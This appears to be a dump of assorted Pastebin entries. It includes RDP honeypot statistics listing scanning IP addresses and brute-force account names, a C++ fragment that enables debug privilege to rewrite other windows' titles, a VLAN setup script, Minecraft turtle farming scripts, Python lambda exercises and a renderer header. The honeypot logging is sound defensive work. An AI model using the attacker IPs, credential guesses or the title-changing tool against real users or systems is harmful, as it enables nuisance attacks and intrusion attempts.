            if (hThread == NULL) {
                std::wcout << L""Failed to create thread."" << std::endl;
                return 1;
            }

            std::wcout << L""Window titles are being modified persistently. Press Enter to stop and exit..."" << std::endl;
            std::cin.get();

            running = false;
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        else {
            ModifyWindowTitles(newTitle);
            std::wcout << L""Window titles modified once. Press Enter to exit..."" << std::endl;
            std::cin.get();
        }
    }

    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);

    return 0;
}"
G7dnEEC1,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:17:55 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 2439,
    ""164.92.104.215"": 9,
    ""223.166.31.100"": 6,
    ""185.196.220.41"": 9,
    ""103.126.57.31"": 3,
    ""185.113.106.68"": 9,
    ""167.94.145.104"": 3,
    ""147.185.132.165"": 9,
    ""213.109.202.252"": 21,
    ""167.94.138.57"": 3,
    ""135.26.109.26"": 6,
    ""62.215.34.181"": 6,
    ""91.238.181.22"": 6,
    ""88.214.25.63"": 6,
    ""172.190.111.208"": 12,
    ""88.214.25.61"": 6,
    ""88.214.25.65"": 6,
    ""205.210.31.88"": 9,
    ""66.85.52.121"": 6,
    ""209.237.106.87"": 3,
    ""104.248.154.46"": 3,
    ""152.32.139.190"": 3,
    ""43.134.186.29"": 3,
    ""103.179.220.6"": 6,
    ""80.66.66.250"": 15,
    ""185.234.216.83"": 9,
    ""58.218.199.219"": 15,
    ""205.210.31.180"": 9,
    ""217.61.16.103"": 3,
    ""47.106.214.128"": 3,
    ""87.251.75.211"": 3,
    ""116.140.196.215"": 3,
    ""150.223.56.176"": 108,
    ""205.210.31.204"": 9,
    ""64.227.52.19"": 12,
    ""104.237.154.138"": 3
  },
  ""asn"": {
    ""AS201814"": 2439,
    ""AS14061"": 24,
    ""AS17621"": 6,
    ""AS208046"": 9,
    ""AS138107"": 3,
    ""AS212330"": 9,
    ""AS398705"": 3,
    ""AS396982"": 36,
    ""AS208312"": 21,
    ""AS398324"": 3,
    ""AS6300"": 6,
    ""AS21050"": 6,
    ""AS49434"": 6,
    ""AS29551"": 18,
    ""AS8075"": 12,
    ""AS62537"": 6,
    ""AS16904"": 3,
    ""AS135377"": 3,
    ""AS132203"": 3,
    ""AS149255"": 6,
    ""AS51765"": 15,
    ""AS57523"": 9,
    ""AS4134"": 15,
    ""AS199883"": 3,
    ""AS37963"": 3,
    ""AS208091"": 3,
    ""AS4837"": 3,
    ""AS58519"": 108,
    ""AS63949"": 3
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 2439,
    ""DigitalOcean, LLC"": 24,
    ""China Unicom Shanghai Province Network"": 6,
    ""ColocationX Ltd."": 9,
    ""PT Virtual Data Centra Indonesia"": 3,
    ""Civilisation Information Technology"": 9,
    ""Censys, Inc."": 6,
    ""Google LLC"": 36,
    ""Red Byte LLC"": 21,
    ""Consolidated Communications, Inc."": 6,
    ""Fast Telecommunications Company W.L.L."": 6,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 18,
    ""Microsoft"": 12,
    ""Sauce Labs Inc"": 6,
    ""Arvig Enterprises Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Aceville Pte.ltd"": 3,
    ""Bhavya Net"": 6,
    ""Oy Crea Nova Hosting Solution Ltd"": 15,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Chinanet"": 15,
    ""ArubaCloud UK Network"": 3,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Xhost Internet Solutions LP"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Cloud Computing Corporation"": 108,
    ""Akamai Technologies, Inc."": 3
  },
  ""org"": {
    ""HostSlick"": 2439,
    ""DigitalOcean, LLC"": 24,
    ""Unknown"": 9,
    ""Makut Investments"": 9,
    ""PT Virtual Data Centra Indonesia"": 3,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 9,
    ""Censys, Inc."": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 30,
    ""Censys, Inc"": 3,
    ""Consolidated Communications, Inc."": 6,
    ""Fasttelco"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Sauce Labs Inc"": 6,
    ""Arvig Enterprises Inc"": 3,
    ""Ucloud Information Technology"": 3,
    ""Bhavya"": 6,
    ""Xhost Internet Solutions"": 18,
    ""Chinanet JS"": 15,
    ""Aruba S.p.A. - CLoud Services"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Chinanet SD"": 108,
    ""Linode"": 3
  },
  ""regionName"": {
    ""Virginia"": 2460,
    ""California"": 66,
    ""Shanghai"": 6,
    ""Jakarta"": 3,
    ""Baghdad"": 9,
    ""Michigan"": 6,
    ""Moscow"": 30,
    ""Texas"": 6,
    ""Hawalli"": 6,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 18,
    ""Minnesota"": 3,
    ""Central Singapore"": 3,
    ""Seoul"": 3,
    ""North West"": 3,
    ""Gujarat"": 6,
    ""Uusimaa"": 15,
    ""Jiangsu"": 15,
    ""England"": 3,
    ""Guangdong"": 3,
    ""North Holland"": 3,
    ""Beijing"": 3,
    ""Shandong"": 108
  },
  ""country"": {
    ""United States"": 2541,
    ""China"": 135,
    ""Indonesia"": 3,
    ""Iraq"": 9,
    ""Russia"": 30,
    ""Kuwait"": 6,
    ""France"": 6,
    ""Germany"": 18,
    ""Singapore"": 6,
    ""South Korea"": 3,
    ""India"": 6,
    ""Finland"": 15,
    ""United Kingdom"": 3,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 2511,
    ""(empty)"": 15,
    ""Domain"": 21,
    ""Almaz"": 3,
    ""LwABWeqUj"": 3,
    ""iLKzdb"": 3,
    ""WDdicj"": 3,
    ""Test"": 54,
    ""gsVWIaVjr"": 3,
    ""qttvqw"": 3,
    ""aUBNSr"": 3,
    ""Administrator"": 30,
    ""Administr"": 18,
    ""vYRapnMsx"": 3,
    ""HxwQkk"": 3,
    ""NrUbDL"": 3,
    ""Admin"": 27,
    ""Whatuptime.com"": 27,
    ""Jakartakini123#"": 27,
    ""pXMicPwqP"": 3,
    ""VeVNxA"": 3,
    ""DvqBRC"": 3,
    ""choshfas"": 12,
    ""beio"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2784
  },
  ""client_build"": {
    ""Unknown"": 2784
  },
  ""client_name"": {
    ""Unknown"": 2784
  },
  ""ip_type"": {
    ""Unknown"": 2520,
    ""hosting"": 231,
    ""proxy"": 30,
    ""hosting & proxy"": 3
  }
}"
864qFxnV,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:16:05 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 1626,
    ""164.92.104.215"": 6,
    ""223.166.31.100"": 4,
    ""185.196.220.41"": 6,
    ""103.126.57.31"": 2,
    ""185.113.106.68"": 6,
    ""167.94.145.104"": 2,
    ""147.185.132.165"": 6,
    ""213.109.202.252"": 14,
    ""167.94.138.57"": 2,
    ""135.26.109.26"": 4,
    ""62.215.34.181"": 4,
    ""91.238.181.22"": 4,
    ""88.214.25.63"": 4,
    ""172.190.111.208"": 8,
    ""88.214.25.61"": 4,
    ""88.214.25.65"": 4,
    ""205.210.31.88"": 6,
    ""66.85.52.121"": 4,
    ""209.237.106.87"": 2,
    ""104.248.154.46"": 2,
    ""152.32.139.190"": 2,
    ""43.134.186.29"": 2,
    ""103.179.220.6"": 4,
    ""80.66.66.250"": 10,
    ""185.234.216.83"": 6,
    ""58.218.199.219"": 10,
    ""205.210.31.180"": 6,
    ""217.61.16.103"": 2,
    ""47.106.214.128"": 2,
    ""87.251.75.211"": 2,
    ""116.140.196.215"": 2,
    ""150.223.56.176"": 72,
    ""205.210.31.204"": 6,
    ""64.227.52.19"": 8,
    ""104.237.154.138"": 2
  },
  ""asn"": {
    ""AS201814"": 1626,
    ""AS14061"": 16,
    ""AS17621"": 4,
    ""AS208046"": 6,
    ""AS138107"": 2,
    ""AS212330"": 6,
    ""AS398705"": 2,
    ""AS396982"": 24,
    ""AS208312"": 14,
    ""AS398324"": 2,
    ""AS6300"": 4,
    ""AS21050"": 4,
    ""AS49434"": 4,
    ""AS29551"": 12,
    ""AS8075"": 8,
    ""AS62537"": 4,
    ""AS16904"": 2,
    ""AS135377"": 2,
    ""AS132203"": 2,
    ""AS149255"": 4,
    ""AS51765"": 10,
    ""AS57523"": 6,
    ""AS4134"": 10,
    ""AS199883"": 2,
    ""AS37963"": 2,
    ""AS208091"": 2,
    ""AS4837"": 2,
    ""AS58519"": 72,
    ""AS63949"": 2
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 1626,
    ""DigitalOcean, LLC"": 16,
    ""China Unicom Shanghai Province Network"": 4,
    ""ColocationX Ltd."": 6,
    ""PT Virtual Data Centra Indonesia"": 2,
    ""Civilisation Information Technology"": 6,
    ""Censys, Inc."": 4,
    ""Google LLC"": 24,
    ""Red Byte LLC"": 14,
    ""Consolidated Communications, Inc."": 4,
    ""Fast Telecommunications Company W.L.L."": 4,
    ""Datacenter location PAR1 France"": 4,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""Microsoft"": 8,
    ""Sauce Labs Inc"": 4,
    ""Arvig Enterprises Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Aceville Pte.ltd"": 2,
    ""Bhavya Net"": 4,
    ""Oy Crea Nova Hosting Solution Ltd"": 10,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Chinanet"": 10,
    ""ArubaCloud UK Network"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Xhost Internet Solutions LP"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Cloud Computing Corporation"": 72,
    ""Akamai Technologies, Inc."": 2
  },
  ""org"": {
    ""HostSlick"": 1626,
    ""DigitalOcean, LLC"": 16,
    ""Unknown"": 6,
    ""Makut Investments"": 6,
    ""PT Virtual Data Centra Indonesia"": 2,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 6,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Chang Way Technologies Co. Limited"": 20,
    ""Censys, Inc"": 2,
    ""Consolidated Communications, Inc."": 4,
    ""Fasttelco"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 16,
    ""Microsoft Azure Cloud (eastus)"": 8,
    ""Sauce Labs Inc"": 4,
    ""Arvig Enterprises Inc"": 2,
    ""Ucloud Information Technology"": 2,
    ""Bhavya"": 4,
    ""Xhost Internet Solutions"": 12,
    ""Chinanet JS"": 10,
    ""Aruba S.p.A. - CLoud Services"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""Chinanet SD"": 72,
    ""Linode"": 2
  },
  ""regionName"": {
    ""Virginia"": 1640,
    ""California"": 44,
    ""Shanghai"": 4,
    ""Jakarta"": 2,
    ""Baghdad"": 6,
    ""Michigan"": 4,
    ""Moscow"": 20,
    ""Texas"": 4,
    ""Hawalli"": 4,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 12,
    ""Minnesota"": 2,
    ""Central Singapore"": 2,
    ""Seoul"": 2,
    ""North West"": 2,
    ""Gujarat"": 4,
    ""Uusimaa"": 10,
    ""Jiangsu"": 10,
    ""England"": 2,
    ""Guangdong"": 2,
    ""North Holland"": 2,
    ""Beijing"": 2,
    ""Shandong"": 72
  },
  ""country"": {
    ""United States"": 1694,
    ""China"": 90,
    ""Indonesia"": 2,
    ""Iraq"": 6,
    ""Russia"": 20,
    ""Kuwait"": 4,
    ""France"": 4,
    ""Germany"": 12,
    ""Singapore"": 4,
    ""South Korea"": 2,
    ""India"": 4,
    ""Finland"": 10,
    ""United Kingdom"": 2,
    ""The Netherlands"": 2
  },
  ""account"": {
    ""hello"": 1674,
    ""(empty)"": 10,
    ""Domain"": 14,
    ""Almaz"": 2,
    ""LwABWeqUj"": 2,
    ""iLKzdb"": 2,
    ""WDdicj"": 2,
    ""Test"": 36,
    ""gsVWIaVjr"": 2,
    ""qttvqw"": 2,
    ""aUBNSr"": 2,
    ""Administrator"": 20,
    ""Administr"": 12,
    ""vYRapnMsx"": 2,
    ""HxwQkk"": 2,
    ""NrUbDL"": 2,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""Jakartakini123#"": 18,
    ""pXMicPwqP"": 2,
    ""VeVNxA"": 2,
    ""DvqBRC"": 2,
    ""choshfas"": 8,
    ""beio"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1856
  },
  ""client_build"": {
    ""Unknown"": 1856
  },
  ""client_name"": {
    ""Unknown"": 1856
  },
  ""ip_type"": {
    ""Unknown"": 1680,
    ""hosting"": 154,
    ""proxy"": 20,
    ""hosting & proxy"": 2
  }
}"
ryhbSt6L,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 813,
    ""164.92.104.215"": 3,
    ""223.166.31.100"": 2,
    ""185.196.220.41"": 3,
    ""103.126.57.31"": 1,
    ""185.113.106.68"": 3,
    ""167.94.145.104"": 1,
    ""147.185.132.165"": 3,
    ""213.109.202.252"": 7,
    ""167.94.138.57"": 1,
    ""135.26.109.26"": 2,
    ""62.215.34.181"": 2,
    ""91.238.181.22"": 2,
    ""88.214.25.63"": 2,
    ""172.190.111.208"": 4,
    ""88.214.25.61"": 2,
    ""88.214.25.65"": 2,
    ""205.210.31.88"": 3,
    ""66.85.52.121"": 2,
    ""209.237.106.87"": 1,
    ""104.248.154.46"": 1,
    ""152.32.139.190"": 1,
    ""43.134.186.29"": 1,
    ""103.179.220.6"": 2,
    ""80.66.66.250"": 5,
    ""185.234.216.83"": 3,
    ""58.218.199.219"": 5,
    ""205.210.31.180"": 3,
    ""217.61.16.103"": 1,
    ""47.106.214.128"": 1,
    ""87.251.75.211"": 1,
    ""116.140.196.215"": 1,
    ""150.223.56.176"": 36,
    ""205.210.31.204"": 3,
    ""64.227.52.19"": 4,
    ""104.237.154.138"": 1
  },
  ""asn"": {
    ""AS201814"": 813,
    ""AS14061"": 8,
    ""AS17621"": 2,
    ""AS208046"": 3,
    ""AS138107"": 1,
    ""AS212330"": 3,
    ""AS398705"": 1,
    ""AS396982"": 12,
    ""AS208312"": 7,
    ""AS398324"": 1,
    ""AS6300"": 2,
    ""AS21050"": 2,
    ""AS49434"": 2,
    ""AS29551"": 6,
    ""AS8075"": 4,
    ""AS62537"": 2,
    ""AS16904"": 1,
    ""AS135377"": 1,
    ""AS132203"": 1,
    ""AS149255"": 2,
    ""AS51765"": 5,
    ""AS57523"": 3,
    ""AS4134"": 5,
    ""AS199883"": 1,
    ""AS37963"": 1,
    ""AS208091"": 1,
    ""AS4837"": 1,
    ""AS58519"": 36,
    ""AS63949"": 1
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 813,
    ""DigitalOcean, LLC"": 8,
    ""China Unicom Shanghai Province Network"": 2,
    ""ColocationX Ltd."": 3,
    ""PT Virtual Data Centra Indonesia"": 1,
    ""Civilisation Information Technology"": 3,
    ""Censys, Inc."": 2,
    ""Google LLC"": 12,
    ""Red Byte LLC"": 7,
    ""Consolidated Communications, Inc."": 2,
    ""Fast Telecommunications Company W.L.L."": 2,
    ""Datacenter location PAR1 France"": 2,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Microsoft"": 4,
    ""Sauce Labs Inc"": 2,
    ""Arvig Enterprises Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Aceville Pte.ltd"": 1,
    ""Bhavya Net"": 2,
    ""Oy Crea Nova Hosting Solution Ltd"": 5,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Chinanet"": 5,
    ""ArubaCloud UK Network"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Xhost Internet Solutions LP"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Cloud Computing Corporation"": 36,
    ""Akamai Technologies, Inc."": 1
  },
  ""org"": {
    ""HostSlick"": 813,
    ""DigitalOcean, LLC"": 8,
    ""Unknown"": 3,
    ""Makut Investments"": 3,
    ""PT Virtual Data Centra Indonesia"": 1,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 3,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Chang Way Technologies Co. Limited"": 10,
    ""Censys, Inc"": 1,
    ""Consolidated Communications, Inc."": 2,
    ""Fasttelco"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""Sauce Labs Inc"": 2,
    ""Arvig Enterprises Inc"": 1,
    ""Ucloud Information Technology"": 1,
    ""Bhavya"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Chinanet JS"": 5,
    ""Aruba S.p.A. - CLoud Services"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Chinanet SD"": 36,
    ""Linode"": 1
  },
  ""regionName"": {
    ""Virginia"": 820,
    ""California"": 22,
    ""Shanghai"": 2,
    ""Jakarta"": 1,
    ""Baghdad"": 3,
    ""Michigan"": 2,
    ""Moscow"": 10,
    ""Texas"": 2,
    ""Hawalli"": 2,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 6,
    ""Minnesota"": 1,
    ""Central Singapore"": 1,
    ""Seoul"": 1,
    ""North West"": 1,
    ""Gujarat"": 2,
    ""Uusimaa"": 5,
    ""Jiangsu"": 5,
    ""England"": 1,
    ""Guangdong"": 1,
    ""North Holland"": 1,
    ""Beijing"": 1,
    ""Shandong"": 36
  },
  ""country"": {
    ""United States"": 847,
    ""China"": 45,
    ""Indonesia"": 1,
    ""Iraq"": 3,
    ""Russia"": 10,
    ""Kuwait"": 2,
    ""France"": 2,
    ""Germany"": 6,
    ""Singapore"": 2,
    ""South Korea"": 1,
    ""India"": 2,
    ""Finland"": 5,
    ""United Kingdom"": 1,
    ""The Netherlands"": 1
  },
  ""account"": {
    ""hello"": 837,
    ""(empty)"": 5,
    ""Domain"": 7,
    ""Almaz"": 1,
    ""LwABWeqUj"": 1,
    ""iLKzdb"": 1,
    ""WDdicj"": 1,
    ""Test"": 18,
    ""gsVWIaVjr"": 1,
    ""qttvqw"": 1,
    ""aUBNSr"": 1,
    ""Administrator"": 10,
    ""Administr"": 6,
    ""vYRapnMsx"": 1,
    ""HxwQkk"": 1,
    ""NrUbDL"": 1,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""Jakartakini123#"": 9,
    ""pXMicPwqP"": 1,
    ""VeVNxA"": 1,
    ""DvqBRC"": 1,
    ""choshfas"": 4,
    ""beio"": 1
  },
  ""keyboard"": {
    ""Unknown"": 928
  },
  ""client_build"": {
    ""Unknown"": 928
  },
  ""client_name"": {
    ""Unknown"": 928
  },
  ""ip_type"": {
    ""Unknown"": 840,
    ""hosting"": 77,
    ""proxy"": 10,
    ""hosting & proxy"": 1
  }
}"
xZq9vBji,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Friday 5th of July 2024 07:12:29 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative

its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Support Markdown & 150+ different syntax languages - All Free
Link redirect 
Simple Ads by Google Adsense Few rather than Pastebin
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.....
......................................
.........."
ckUKCraa,vlan Skript,TDCroPower,Bash,Friday 5th of July 2024 07:01:01 PM CDT,"#!/bin/sh
# Set up a VLAN interface on an existing Synology network interface
#
# Copyright (c) 2023 Navigio UG (haftungsbeschr√§nkt)
# This software is provided 'as-is', without any express or implied warranty. 
# In no event will the authors be held liable for any damages arising from the use of this software.
#
# Permission is granted to anyone to use this software for any purpose, including 
# commercial applications, and to alter it and redistribute it freely.
#
# On Host this file needs to be placed into
# /usr/local/etc/rc.d
# insmod /lib/modules/8021q.ko

##### KONFIGURATION #####
# Insert your changes here...
EthernetInterface=""eth0""
BridgeInterface=""mvlbr""
VlanID=""200""
HostIP=""192.168.200.2/24""
BroadcastIP=""192.168.200.255""
ContainerAccessIP=""192.168.200.254/32""
ContainerNetwork=""192.168.200.0/24""
##### KONFIGURATION #####

#### DON'T TOUCH HERE ANYTHING ####### 
# First delete possibly existing VLAN interfaces
ip link del ${BridgeInterface}.${VlanID}
ip link del ${EthernetInterface}.${VlanID}

# Set up networking interface on VLAN ID
# Prerequisite: VLAN has to be set up on router or L3 switch
ip link add link ${EthernetInterface} name ${EthernetInterface}.${VlanID} type vlan id ${VlanID}
ip addr add ${HostIP} brd ${BroadcastIP} dev ${EthernetInterface}.${VlanID}
ip link set dev ${EthernetInterface}.${VlanID} up

# macvlan bridge for communication between host & containers
ip link add ${BridgeInterface}.${VlanID} link ${EthernetInterface}.${VlanID} type macvlan mode bridge
ip addr add ${ContainerAccessIP} dev ${BridgeInterface}.${VlanID}
ip link set ${BridgeInterface}.${VlanID} up
ip route del ${ContainerNetwork}
ip route add ${ContainerNetwork} dev ${BridgeInterface}.${VlanID}
#### DON'T TOUCH HERE ANYTHING #######"
CAm1JKgh,TurtlePostionAPI,PrivateAgentZero,Lua,Friday 5th of July 2024 05:15:15 PM CDT,"local turtlePos = {

}
-- Veritcal Axis = Y

turtlePos.position = {
    x = 0,
    y = 0,
    z = 0,
}


turtlePos.direction = {
    postive_x = 0,
    negative_x = 1,
    postive_z = 2,
    negative_z = 3,
}

turtlePos.turnDirection = {
    left = 0,
    right = 1,
}

turtlePos.facingDirection = turtlePos.direction.postive_x

local function nextState(previous_state, turnDirection)

    local high_bit = bit.blogic_rshift(previous_state,1) 
    local low_bit = bit.band(previous_state,1)

    local nextState = bit.blshift(bit.bxor(high_bit,1),1) + bit.bxor(bit.bxor(bit.bxor(high_bit,low_bit),turnDirection),1)
    return nextState
end

turtlePos.getPosition = function ()
    return turtlePos.position[""x""], turtlePos.position[""y""], turtlePos.position[""z""]
end

turtlePos.turnLeft = function ()
    turtle.turnLeft()
    turtlePos.facingDirection = nextState(turtlePos.facingDirection,turtlePos.turnDirection.left)
end

turtlePos.turnRight = function ()
    turtle.turnRight()
    turtlePos.facingDirection = nextState(turtlePos.facingDirection,turtlePos.turnDirection.right)
end

turtlePos.getFacingDirection = function ()
    return turtlePos.facingDirection
end

turtlePos.forward = function ()
    local moved = turtle.forward() 

    if moved then
        if turtlePos.facingDirection == turtlePos.direction.postive_x then
            turtlePos.position.x = turtlePos.position.x + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_x then
            turtlePos.position.x = turtlePos.position.x - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.postive_z then
            turtlePos.position.z = turtlePos.position.z + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_z then
            turtlePos.position.z = turtlePos.position.z - 1
        end
    end
    
    return moved

end

turtlePos.back = function ()
    local moved = turtle.back() 

    if moved then
        if turtlePos.facingDirection == turtlePos.direction.postive_x then
            turtlePos.position.x = turtlePos.position.x - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_x then
            turtlePos.position.x = turtlePos.position.x + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.postive_z then
            turtlePos.position.z = turtlePos.position.z - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_z then
            turtlePos.position.z = turtlePos.position.z + 1
        end
    end

    return moved
end

turtlePos.up = function ()
    local moved = turtle.up()
    if moved  then
        turtlePos.position.y = turtlePos.position.y + 1
    end
    return moved
end

turtlePos.down = function ()
    local moved = turtle.down()
    if moved  then
        turtlePos.position.y = turtlePos.position.y - 1
    end
    return moved
end

turtlePos.returnToZero = function ()
    local delta_x = turtlePos.position.x;
    local delta_z = turtlePos.position.z;

    if turtlePos.facingDirection == turtlePos.direction.postive_x then
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnRight()
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.negative_x then
        if delta_x > 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.postive_z then
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end        
        turtlePos.turnLeft()
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.negative_z then
        if delta_z > 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end        
        turtlePos.turnRight()
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    end
end

return turtlePos"
yHQRvrt7,TurtleSquareFarm,PrivateAgentZero,Lua,Friday 5th of July 2024 05:14:01 PM CDT,"local FARM_SIZE = 7
local MIN_STAGE = 0
local MAX_STAGE = 7

local crop_seed_id = ""mysticalagriculture:inferium_seeds""
-- local crop_seed_id = ""minecraft:wheat_seeds""

local turtlePos = require(""turtlePos"")

turtle.select(1)

local function replantGrownCrop(data)
    local growth_stage = data[""state""][""age""]

    if growth_stage == MAX_STAGE then
        turtle.digDown()

        ::recheck::
        if not (turtle.getItemDetail()[""name""] == crop_seed_id) then
            turtle.transferTo(16)
            turtle.select(2)
            goto recheck
        end
        turtle.transferTo(1)
        turtle.select(1)
        turtle.placeDown()
    end
end



local direction = {}
direction.x = 1
direction.y = 2

local current_direction = direction.y;
while true do
    local current_x = 1;
    local current_y = 1;
    local n = 1;
    local distance = 1;
    
    -- TODO: REFUELING LOGIC 
    while turtle.getFuelLevel() < FARM_SIZE*FARM_SIZE+20 do
        turtle.suckUp()
        turtle.refuel()
        turtle.dropUp()
    end
    -- ITEM DROP OFF

    for i=1,16 do
        turtle.select(i)
        turtle.dropDown()
    end
    turtle.select(1)

    while(n < FARM_SIZE*FARM_SIZE) do
        turtlePos.forward()
        local is_block, data = turtle.inspectDown()
    
        if not is_block then
            goto continue
        end
        
        replantGrownCrop(data)
        
        ::continue::
        local distance_shift = math.floor(distance/4)
        
        if current_y == (FARM_SIZE - distance_shift) then
            turtlePos.turnRight()
            distance = distance + 1;
            current_direction = direction.x
            current_y = 1+distance_shift;
        end
    
        if current_x == (FARM_SIZE - distance_shift)  then
            turtlePos.turnRight()
            distance = distance + 1;
            current_direction = direction.y
            current_x = 1+distance_shift;
        end
    
        if current_direction == direction.y then
            current_y = current_y + 1;
        elseif current_direction == direction.x then
            current_x = current_x + 1;
        end
        n = n + 1
    end
    turtlePos.returnToZero()
end




-- for k, v in pairs(data[""state""]) do
--     -- print(k, v)
-- end

::exit::
"
NY7Ar7RL,potatoFarmer,BenDipp,Lua,Friday 5th of July 2024 04:33:43 PM CDT,"while true do
    local isThere, infos = turtle.inspect()
    if infos.state.age == 7 then
        turtle.dig()
        turtle.place()

        turtle.turnRight()
        turtle.turnRight()

        turtle.select(2)
        turtle.drop()
        turtle.select(1)

        turtle.turnRight()
        turtle.turnRight()
    end
    sleep(10)
end"
Tmg7u9uv,lambda,koulin,Python,Friday 5th of July 2024 04:07:19 PM CDT,"# task 2 
def cube(array):
    return list(map(lambda x : x ** 3, array))

# task 3
def low(array):
    return list(filter(lambda x : x < 0, array))

# task 4
from functools import reduce

def factorial(x):
    return reduce((lambda x,y : x * y), [i for i in range(1, x + 1)])

# task 5 
def mx(array):
    L = list(filter(lambda x :(x ** 2) % 9 == 0, array))
    answer = reduce(lambda a , b: a if a > b else b, L)
    return answer
"
SPuGMFVN,Renderer.cpp,Zgragselus,C++,Friday 5th of July 2024 03:48:41 PM CDT,"///////////////////////////////////////////////////////////////////////////////////////////////////
//
// Renderer.cpp
// 
///////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////
// Header section

#include ""Game/Loader/Assimp.h""
#include ""Renderer.h""
#include <Graphics/System/MaterialSystem.h>

///////////////////////////////////////////////////////////////////////////////////////////////////
// Declaration section

///////////////////////////////////////////////////////////////////////////////////////////////////
// Definition section

/// <summary>
/// Parametric constructor.
/// 
/// Builds renderer and sets everything up.
/// </summary>
/// <param name=""engine"">Pointer to Engine instance</param>
/// <param name=""eventSystem"">Pointer to event system instance</param>
/// <param name=""options"">Pointer to configuration instance</param>
/// <param name=""log"">Pointer to logging system</param>
/// <param name=""renderer"">Pointer to Direct3D 12 renderer</param>
/// <param name=""swapChain"">Pointer to Swap chain for window</param>
